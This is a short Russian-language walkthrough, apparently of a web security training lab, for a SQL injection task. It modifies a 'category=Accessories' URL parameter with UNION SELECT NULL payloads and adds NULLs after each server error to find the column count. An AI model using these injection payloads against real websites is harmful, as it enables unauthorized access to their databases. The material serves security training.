1) Заходим на сайт задания
2) Переходим в категорию Accessories
3) Изменяем запрос на category=Accessories'+UNION+SELECT+NULL--
4) Получаем ошибку сервера, добавляем еще один NULL в запрос: category=Accessories'+UNION+SELECT+NULL,NULL--
5) Снова получаем ошибку и добавляем еще один NULL: category=Accessories'+UNION+SELECT+NULL,NULL,NULL--